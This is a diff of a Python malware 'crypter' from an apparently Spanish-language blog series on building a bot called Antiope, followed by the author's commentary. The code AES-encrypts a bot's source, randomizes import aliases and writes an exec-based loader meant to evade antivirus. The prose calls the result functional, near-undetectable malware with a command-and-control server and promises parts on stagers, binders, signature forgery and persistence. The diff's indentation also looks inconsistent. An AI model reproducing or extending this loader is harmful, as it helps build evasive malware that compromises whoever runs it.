@@ -324,52 +324,52 @@ def load_file():
     if botsource:
         try:
 
-			BLOCK_SIZE = 32
-			PADDING = '{'
+	BLOCK_SIZE = 32
+	PADDING = '{'
 
-			Pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
-			Enc = lambda c, m: base64.b64encode(c.encrypt(Pad(m)))
-			Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+	Pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
+	Enc = lambda c, m: base64.b64encode(c.encrypt(Pad(m)))
+	Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 
-			def randomKey(bytes):
-			    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$[]|?/&") for i in range(bytes)) 
-			def randomName():
-			    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(3)) 
-			def randomAscii():
-			    return ''.join(random.choice(string.ascii_letters) for i in range(3)) 
+	def randomKey(bytes):
+	    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$[]|?/&") for i in range(bytes)) 
+	def randomName():
+	    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(3)) 
+	def randomAscii():
+	    return ''.join(random.choice(string.ascii_letters) for i in range(3)) 
 
-			key = randomKey(32)
-			iv =  randomKey(16)
-			ck = randomKey(16)
+	key = randomKey(32)
+	iv =  randomKey(16)
+	ck = randomKey(16)
 
-			cipher = AES.new(key, AES.MODE_CBC, iv)
+	cipher = AES.new(key, AES.MODE_CBC, iv)
 
-			imports = list()
-			lines = list()
+	imports = list()
+	lines = list()
 
-			for s in botsource:
-				if not s.startswith('#'):
-					if 'import' in s:
-						imports.append(s.strip())
-					else:
-						lines.append(s)
+	for s in botsource:
+		if not s.startswith('#'):
+			if 'import' in s:
+				imports.append(s.strip())
+			else:
+				lines.append(s)
 
-			enced = Enc(cipher, "".join(lines))
-			b64Name = randomAscii() + randomName()
-			aesName = randomAscii() + randomName()
+	enced = Enc(cipher, "".join(lines))
+	b64Name = randomAscii() + randomName()
+	aesName = randomAscii() + randomName()
 
-			imports.append('import time, os, requests, sys, platform, socket, locale, settings, re')
-			imports.append('from base64 import b64decode as ' + b64Name)
-			imports.append('from Crypto.Cipher import AES as ' + aesName)
-			random.shuffle(imports)
-			cryptedsource.write(';'.join(imports) + "\n")
+	imports.append('import time, os, requests, sys, platform, socket, locale, settings, re')
+	imports.append('from base64 import b64decode as ' + b64Name)
+	imports.append('from Crypto.Cipher import AES as ' + aesName)
+	random.shuffle(imports)
+	cryptedsource.write(';'.join(imports) + "\n")
 
-			cmd = "exec(%s.new(\'%s\', %s.MODE_CBC, \'%s\').decrypt(%s(\'%s\')).rstrip('{'))\n" %(aesName, key, aesName, iv, b64Name, enced)
+	cmd = "exec(%s.new(\'%s\', %s.MODE_CBC, \'%s\').decrypt(%s(\'%s\')).rstrip('{'))\n" %(aesName, key, aesName, iv, b64Name, enced)
 
-			cryptedsource.write('exec(%s(\'%s\'))' %(b64Name, base64.b64encode(cmd)))
-			cryptedsource.close
+	cryptedsource.write('exec(%s(\'%s\'))' %(b64Name, base64.b64encode(cmd)))
+	cryptedsource.close
 
-			tkMessageBox.showinfo("Successfully generated!", "Sourcecode encrypted and saved.\nYou can build your bot now!")
+	tkMessageBox.showinfo("Successfully generated!", "Sourcecode encrypted and saved.\nYou can build your bot now!")
 
         except:
             showerror("Open Source File", "Failed to read file\n'%s'" % botsource)
@@ -583,9 +583,10 @@ function download_execute(e) {
 
 &nbsp;
 
-¡Voila! Un malware funcional y casi indetectable (hay que tener en cuenta que lo hice con fines educativos; publicando el código y subiendo los samples a virustotal).
+¡Voila! Un malware funcional y casi indetectable (hay que tener en cuenta que lo hice con fines educativos; publicando el código y subiendo los samples a virustotal). Por supuesto hay que decir que malware en Python tiene ciertas desventajas: El ejecutable tiene que llevar todas las dependencias y por eso se infla hasta los 10MB que es mucho para la poca funcionalidad que tiene. La programación en Windows es tediosa. Claro que un malware hecho en ASM deja menos huella en el sistema y por su pequeño fingerprint es más difícil de detectar. Los foros están llenos de consejos sobre como programar troyanos en C, C# y Visual Basic o AutoIt, pero Python esta muy bien documentado, funciona tanto en Mac, como en Linux e Windows. El CnC de antiope puede correr en un Windows 10 o en un servidor linux con recursos minimos. Python es facil de entender y aprender. Es perfectamente integrable en un framework como metasploit. Tools como Pyherion, Veil y similares marcan el camino.
 
-En la segunda parte daré otra vuelta a Antiope y me centraré en stagers, binders y en la falsificación de firmas.
+En la segunda parte daré otra vuelta a Antiope y me centraré en stagers, binders, y en la falsificación de firmas.
+La tercera parte ira enfocando a camuflar la presencia y conseguir la persistencia en el sistema. 
 
 Mientras, dejo más material para aprender sobre el lado oscuro de python:
 
